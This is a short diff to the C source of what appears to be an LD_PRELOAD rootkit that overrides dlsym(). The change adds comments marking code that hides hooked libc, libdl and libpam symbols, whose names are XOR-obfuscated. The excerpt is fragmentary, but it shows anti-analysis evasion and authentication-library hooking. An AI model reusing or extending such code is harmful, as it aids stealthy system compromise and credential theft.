@@ -38,6 +38,7 @@ void *dlsym(void *handle, const char *symbol)
 
     // we need to manipulate dlsym() so that it isn't allowed to resolve the address of hooked symbols
     
+    // spoof for libc symbols
     for(i = 0; i < LIBC_SIZE; i++)
     {
         char *curr_call = strdup(libc_calls[i]); xor(curr_call);
@@ -52,6 +53,7 @@ void *dlsym(void *handle, const char *symbol)
         }
     }
 
+    // spoof for libdl symbols
     for(i = 0; i < LIBDL_SIZE; i++)
     {
         char *curr_call = strdup(libdl_calls[i]); xor(curr_call);
@@ -66,6 +68,7 @@ void *dlsym(void *handle, const char *symbol)
         }
     }
 
+    // spoof for libpam
     for(i = 0; i < LIBPAM_SIZE; i++)
     {
         char *curr_call = strdup(libpam_calls[i]); xor(curr_call);
